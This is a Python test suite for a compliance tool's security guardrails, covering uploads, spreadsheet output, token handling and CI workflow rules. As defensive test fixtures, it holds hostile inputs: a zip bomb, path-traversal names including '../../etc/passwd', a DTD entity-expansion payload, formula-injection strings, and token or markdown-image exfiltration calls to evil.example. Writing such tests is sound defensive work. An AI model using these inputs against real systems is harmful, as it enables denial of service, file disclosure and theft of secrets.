"""Security guardrails: hostile uploads, formula injection, token handling, and the rules every workflow must keep
(least-privilege permissions, actions pinned to commits, hash-locked installs, no expressions in scripts)."""
import io
import re
import zipfile
from pathlib import Path

import pytest
import yaml

from grc import ingest, locks, safety
from grc.cli import main

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml")) + \
    sorted((ROOT / "grc" / "resources" / "client" / "dot-github" / "workflows").glob("*.yml"))


def _new(tmp_path):
    root = tmp_path / "repo"
    assert main(["--engagement", str(root / "engagement"), "new-engagement", "--client", "Larch & Finch",
                 "--start", "2026-11-09", "--stage1", "2027-02-01", "--stage2", "2027-06-01", "--framework", "soc2",
                 "--intake", str(root / "intake"), "--confirm-reset"]) == 0
    return root / "engagement", root / "intake"


# ------------------------------------------------------------------ hostile uploads
def test_symlink_in_intake_is_never_read(tmp_path):
    edir, intake = _new(tmp_path)
    secret = tmp_path / "runner-secret.txt"
    secret.write_text("TOKEN=not-for-claude")
    (intake / "notes.txt").symlink_to(secret)
    report = ingest.run(edir, intake, mode="templates")
    assert "`notes.txt`: **not processed**, because it is a symbolic link" in report
    assert "not-for-claude" not in report


def _zip(path, members):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)


def test_zip_bombs_and_bad_paths_are_refused(tmp_path):
    bomb = tmp_path / "bomb.xlsx"
    _zip(bomb, {"xl/worksheets/sheet1.xml": b"\0" * (20 * 1024 * 1024)})
    with pytest.raises(safety.UnsafeFile, match="zip bomb"):
        safety.check_upload(bomb)
    trav = tmp_path / "trav.xlsx"
    _zip(trav, {"../../evil.xml": b"<x/>"})
    with pytest.raises(safety.UnsafeFile, match="outside the package"):
        safety.check_upload(trav)
    with pytest.raises(safety.UnsafeFile, match="not a valid Office file"):
        (tmp_path / "fake.docx").write_bytes(b"not a zip")
        safety.check_upload(tmp_path / "fake.docx")


def test_oversized_and_damaged_uploads_are_reported_not_crashed(tmp_path, monkeypatch):
    edir, intake = _new(tmp_path)
    (intake / "big.txt").write_text("x" * 2048)
    monkeypatch.setattr(safety, "MAX_FILE_BYTES", 1024)
    monkeypatch.setattr(safety.check_file, "__defaults__", (None, 1024))
    (intake / "broken.xlsx").write_bytes(b"PK\x03\x04 truncated")
    report = ingest.run(edir, intake, mode="templates")
    assert "`big.txt`: **not processed**, because it is 0 MB; the limit is 0 MB" in report
    assert "`broken.xlsx`: **not processed**" in report


def test_xml_with_a_dtd_is_refused():
    lol = b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><l>&b;</l>'
    with pytest.raises(safety.UnsafeFile, match="DTD"):
        safety.xml_root(lol)
    assert safety.xml_root(b"<a><b/></a>").tag == "a"


# ------------------------------------------------------------------ formula injection
def test_text_that_would_start_a_formula_stays_text():
    assert [safety.cell_text(v) for v in ("=HYPERLINK(\"x\")", "+1", "-2", "@SUM(A1)", "ok", 3)] == [
        "'=HYPERLINK(\"x\")", "'+1", "'-2", "'@SUM(A1)", "ok", 3]


def test_program_report_and_matrix_keep_record_text_as_text(tmp_path):
    from openpyxl import load_workbook
    edir, _ = _new(tmp_path)
    f = edir / "controls" / "CC6.1.yaml"
    d = yaml.safe_load(f.read_text())
    d["implementation"] = '=HYPERLINK("https://example.invalid","click")'
    f.write_text(yaml.safe_dump(d, sort_keys=False))
    out = tmp_path / "out"
    assert main(["--engagement", str(edir), "build", "--out", str(out)]) == 0
    wb = load_workbook(next(out.glob("*-workbook.xlsx")))
    seen = 0
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if isinstance(c.value, str) and "HYPERLINK" in c.value:
                    assert c.data_type == "s", (ws.title, c.coordinate)
                    seen += 1
    assert seen


# ------------------------------------------------------------------ credentials go only where they should
def test_github_token_only_goes_to_the_api():
    from grc.issues import GitHub
    with pytest.raises(ValueError, match="refusing to send the GitHub token"):
        GitHub("acme/repo", "t").call("GET", "https://evil.example/collect")


def test_collectors_call_https_only():
    from grc.collectors import http
    with pytest.raises(ValueError, match="https:// endpoints only"):
        http.request("GET", "http://insecure.example/api")


# ------------------------------------------------------------------ workflow rules
def _steps(path):
    d = yaml.safe_load(path.read_text())
    for job in (d.get("jobs") or {}).values():
        yield from job.get("steps") or []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_workflow_rules(path):
    text = path.read_text()
    d = yaml.safe_load(text)
    # least privilege: a top-level permissions block (reusable workflows too) or one on every job
    assert "permissions" in d or all("permissions" in j for j in d["jobs"].values()), path.name
    for s in _steps(path):
        uses = s.get("uses") or ""
        if uses and not uses.startswith("./") and "__ENGINE_REPO__" not in uses:
            assert re.search(r"@[0-9a-f]{40}$", uses), f"{path.name}: {uses} is not pinned to a commit"
        run = s.get("run") or ""
        assert "${{" not in run, f"{path.name}: an expression inside a run script; pass it through env"
        for line in run.splitlines():
            if re.match(r"\s*pip install\b", line) and "pip-tools" not in line:
                # unlocked only: the client's own extra requirements, and the old-engine fallback (which warns)
                assert ("--require-hashes" in line or "--no-deps" in line or "requirements.txt" in line
                        or "resolved the old way" in line), \
                    f"{path.name}: unlocked install: {line.strip()}"


def test_no_workflow_runs_untrusted_code_with_secrets():
    for path in WORKFLOWS:
        assert "pull_request_target" not in path.read_text(), path.name


def test_secrets_are_passed_by_name_and_declared():
    import re as _re
    declared = {}
    for path in (ROOT / ".github" / "workflows").glob("grc-*.yml"):
        d = yaml.safe_load(path.read_text())
        call = (d.get(True) or d.get("on"))["workflow_call"] or {}
        declared[path.name] = set(call.get("secrets") or {})
        used = set(_re.findall(r"secrets\.([A-Z_0-9]+)", path.read_text())) - {"GITHUB_TOKEN"}
        assert used <= declared[path.name], (path.name, used - declared[path.name])
    for path in WORKFLOWS:
        d = yaml.safe_load(path.read_text())
        for job in d["jobs"].values():
            assert job.get("secrets") != "inherit", f"{path.name}: pass secrets by name"
            m = _re.search(r"grc-[a-z-]+\.yml", str(job.get("uses") or ""))
            if m and isinstance(job.get("secrets"), dict):
                assert set(job["secrets"]) <= declared[m.group(0)], path.name


def test_lock_files():
    assert locks.path("engine").endswith("grc/resources/locks/engine.txt")
    with pytest.raises(SystemExit):
        locks.path("../../etc/passwd")
    missing = [n for n in locks.NAMES if not Path(locks.path(n)).exists()]
    if missing:
        pytest.skip(f"lock files not generated yet: {missing} (the Security workflow prints them)")
    for n in locks.NAMES:
        reqs = [ln for ln in Path(locks.path(n)).read_text().splitlines() if re.match(r"^[A-Za-z0-9]", ln)]
        assert reqs and all("==" in ln for ln in reqs), n
        assert "--hash=sha256:" in Path(locks.path(n)).read_text(), n


# ------------------------------------------------------------------ review cases
def test_dtd_refused_in_any_encoding_and_position():
    body = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE l [<!ENTITY a "aa">]><l>&a;</l>'
    with pytest.raises(safety.UnsafeFile, match="DTD"):
        safety.xml_root(body.encode("utf-16"))
    late = b'<?xml version="1.0"?><!--' + b"x" * 5000 + b'--><!DOCTYPE l><l/>'
    with pytest.raises(safety.UnsafeFile, match="DTD"):
        safety.xml_root(late)


def test_ingest_report_text_is_inert():
    assert safety.md_text("see ![](https://evil.example/p?d=x) @acme/security <!-- hide") == \
        "see \\!\\[\\]\\(https://evil.example/p?d=x\\) @⁠acme/security &lt;\\!-- hide"
    assert safety.md_code("a` @victim <!--.txt") == "`a' @victim <!--.txt`"
    from grc.ingest.apply import render_report
    rep = {k: [] for k in ("narrative", "added_gaps", "added_evidence", "claims", "inventory", "suggested", "kept", "dropped")}
    rep["added_gaps"] = ["GAP-01: ![x](https://evil.example/leak) cc @someone <!--"]
    out = render_report(rep, [], "intake")
    assert "](https://" not in out and "@someone" not in out and "<!--" not in out


def test_symlinked_timesheet_is_not_imported(tmp_path):
    from grc import hours
    from grc.model import load
    edir, intake = _new(tmp_path)
    secret = tmp_path / "secret.csv"
    secret.write_text("Date,Hours,Client,Project,Notes\n2026-11-09,1,Larch & Finch,Readiness,leak\n")
    (intake / "timesheets").mkdir(exist_ok=True)
    (intake / "timesheets" / "t.csv").symlink_to(secret)
    log = hours.import_files(load(edir), [intake / "timesheets" / "t.csv"])
    assert any("not imported, because it is a symbolic link" in x for x in log)


def test_formula_guard_ignores_leading_space_and_full_width():
    assert safety.cell_text(" =1+1") == "' =1+1" and safety.cell_text("＝1") == "'＝1"
